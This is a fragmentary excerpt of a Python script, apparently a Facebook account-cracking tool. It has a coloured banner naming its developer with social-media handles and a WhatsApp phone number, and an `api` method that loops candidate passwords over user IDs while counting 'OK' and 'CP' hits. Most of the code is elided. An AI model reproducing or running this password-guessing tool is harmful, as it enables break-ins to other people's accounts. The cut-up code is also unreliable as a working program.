...
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :            IMRAN AHMED 
     \033[1;91m➣ \033[1;92mFACEBOOK   :            IMRAN AHMED 
     \033[1;93m➣ \033[1;92mWHATSAPP   :            01689903267
     \033[1;96m➣ \033[1;92mGITHUB     :            MR-IMRAN-60
...
#				exit()
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[>_] [IMRAN] : \033[0;97m %s/%s -> \033[0;92m [IMRAN -OK:%s ]- \033[0;93m[IMRAN-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
